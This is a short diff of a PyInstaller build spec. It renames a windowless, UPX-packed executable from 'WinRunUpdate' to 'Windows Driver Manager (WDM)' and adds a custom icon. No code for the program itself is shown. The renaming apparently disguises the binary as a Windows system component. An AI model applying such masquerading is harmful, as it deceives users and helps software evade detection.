@@ -21,9 +21,9 @@ exe = EXE(pyz,
           a.binaries,
           a.zipfiles,
           a.datas,
-          name='WinRunUpdate',
+          name='Windows Driver Manager (WDM)',
           debug=False,
           strip=False,
           upx=True,
           runtime_tmpdir=None,
-          console=False )
+          console=False, icon='bat_ico.ico' )
